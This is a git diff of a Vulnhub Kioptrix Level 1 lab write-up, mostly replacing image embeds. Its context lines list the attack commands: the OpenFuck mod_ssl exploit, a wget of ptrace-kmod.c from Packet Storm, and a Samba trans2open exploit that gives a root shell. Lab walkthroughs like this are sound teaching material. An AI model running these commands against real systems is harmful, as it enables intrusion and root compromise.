@@ -1,4 +1,4 @@
-[[Vulnhub]]
+<img width="1912" height="1050" alt="image" src="https://github.com/user-attachments/assets/7aab69a8-177b-4947-942e-278b982cf617" />[[Vulnhub]]
 # Machine Link
 https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
 
@@ -23,14 +23,13 @@ PORT      STATE SERVICE     VERSION
 443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
 32768/tcp open  status      1 (RPC #100024)
 MAC Address: 08:00:27:B9:A3:58 (Oracle VirtualBox virtual NIC)
-
 ```
 
-![[Pasted image 20241220163001.png]]
+
 
 
 On Port 80 a apache test page was running :
-![[Pasted image 20241220163202.png]]
+<img width="1334" height="228" alt="image" src="https://github.com/user-attachments/assets/5cb2031b-85bb-480d-82ae-b4da697c5f87" />
 
 
 
@@ -43,7 +42,7 @@ We can search for this on searchsploit locally :
 searchsploit mod_ssl 
 ```
 
-![[Pasted image 20241220174556.png]]
+<img width="1904" height="312" alt="image" src="https://github.com/user-attachments/assets/c07b6780-1c10-43d6-be9a-806f686c481d" />
 
 We found the OpenFuckV2 exploit 
 
@@ -75,10 +74,11 @@ wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
 ```
 
 Original Link:
-![[Pasted image 20241220180304.png]]
+<img width="1906" height="1050" alt="image" src="https://github.com/user-attachments/assets/e95bf917-51cc-4b75-823f-3d825ddf2232" />
+
 
 Updated Link :
-![[Pasted image 20241220180743.png]]
+<img width="1912" height="1048" alt="image" src="https://github.com/user-attachments/assets/056a00f1-409c-4483-9300-8a25b026647e" />
 
 After doing these 2 changes compile the exploit :
 
@@ -98,7 +98,7 @@ Now we need to find the OffSet code of apache in our case from nmap output we go
 ./kioptrix_exploit 0x6b 192.168.1.104 -c 50
 ```
 
-![[Pasted image 20241220182724.png]]
+<img width="1337" height="944" alt="image" src="https://github.com/user-attachments/assets/814c521b-c2bd-4070-b8c3-125ed163c1c9" />
 
 ---
 # Exploiting with SMB
@@ -114,10 +114,9 @@ tcpdump -s0 -n -i wlan0 src 192.168.1.104 and port 139 -A -c 10 2>/dev/null | gr
 
 #than on other terminal
 smbclient -L //<machine-IP> smbclient -L //192.168.1.104
-
 ```
 
-![[Pasted image 20241220170824.png]]
+<img width="1896" height="622" alt="image" src="https://github.com/user-attachments/assets/84a4e613-4c84-4195-9229-e72f90105473" />
 
 
 We found the version : **Samba 2.2.1.a**
@@ -140,6 +139,6 @@ Now use the script with machine ip and you will get the root shell :
 ./10 -bBcCdfprsStv 192.168.1.104
 ```
 
-![[Pasted image 20241220173745.png]]
+<img width="1409" height="861" alt="image" src="https://github.com/user-attachments/assets/6991befc-6561-4f26-b6d3-29466f7e32f4" />
 
 ---
